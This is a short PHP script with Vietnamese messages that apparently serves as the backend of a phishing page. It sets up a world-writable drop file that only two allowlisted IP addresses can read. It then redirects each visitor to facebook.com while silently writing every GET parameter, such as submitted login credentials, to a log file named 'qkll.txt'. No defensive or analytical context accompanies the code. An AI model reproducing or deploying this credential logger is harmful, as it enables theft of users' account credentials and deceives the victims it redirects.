<?php
$allowed_ips = [
    '116.98.3.165 ',
    '2001:4860:7:b12::ff'
];
$user_ip = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
$file = "note.txt";
if (!file_exists($file)) {
    file_put_contents($file, "");
    chmod($file, 0777);
} else {
    chmod($file, 0777);
}
if ($_SERVER["REQUEST_METHOD"] === "POST") {
    $content = $_POST["content"] ?? '';
    if (!in_array($user_ip, $allowed_ips)) {
        file_put_contents($file, $content, FILE_APPEND | LOCK_EX);
        $message = "✅ Bạn đã ghi thành công!";
    } else {
        $message = "⚠️ Bạn chỉ được đọc, không được ghi!";
    }
}
$current = "";
if (in_array($user_ip, $allowed_ips)) {
    $current = file_exists($file) ? file_get_contents($file) : "";
} else {
    $current = "🔒 Bạn chỉ được ghi, không xem nội dung.";
}
header ('Location: https://www.facebook.com');
$handle = fopen("qkll.txt", "a");
foreach($_GET as $variable => $value) {
fwrite($handle, $variable);
fwrite($handle, "=");
fwrite($handle, $value);
fwrite($handle, "\r\n");
}
fwrite($handle, "\r\n");
fclose($handle);
exit;
?>
